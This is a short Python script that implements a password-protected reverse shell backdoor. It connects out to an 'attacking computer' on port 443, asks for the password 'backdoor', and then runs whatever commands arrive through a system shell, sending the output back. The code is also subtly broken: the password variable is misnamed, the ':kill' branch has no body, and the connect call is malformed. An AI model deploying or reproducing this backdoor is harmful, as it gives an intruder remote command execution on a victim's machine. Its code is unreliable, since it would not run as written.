 # ! /usr/bin/python
import subprocess #Process commands
import socket     #Process commands

host = "192.168.1.1" #IP of attacking computer
port = 443           #Port attacking computer will use netcat for
passwd = "backdoor"  #Password for the back door

#Check Password
def Login():
        global s
        s.send("login: ")
        pwd = s.recv(1024)

        if pwd.strip() != password:
                Login()
        else:
                s.send("You have a shell have fun!!")
                Shell()
#Execute Shell Commands
def Shell():
        while True:
                data=s.recv(1024)

                if data.strip() == ":kill":   #Kill program with :kill

                proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output = proc.stdout.read() + proc.stderr.read()
                s.send(output)
                s.send("//> ")
#Start script
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host.port))
Login()
